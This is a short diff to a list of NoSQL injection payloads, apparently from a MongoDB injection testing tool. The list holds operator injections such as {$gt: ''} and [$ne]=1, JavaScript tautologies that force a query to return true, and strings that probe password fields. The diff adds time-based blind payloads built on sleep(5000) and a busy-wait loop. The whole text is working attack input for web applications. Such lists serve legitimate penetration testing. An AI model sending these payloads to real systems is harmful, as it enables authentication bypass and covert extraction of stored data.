@@ -23,7 +23,12 @@ payload_list = [
   "'%20%26%26%20this.password.match(/.*/)//+%00",
   "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
   "{$gt: ''}",
+  '{"$gt": ""}',
   "[$ne]=1",
+  "';sleep(5000);",
+  "';sleep(5000);'",
+  "';sleep(5000);+'",
+  "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
   "';return 'a'=='a' && ''=='",
   "0;return true",
 ]
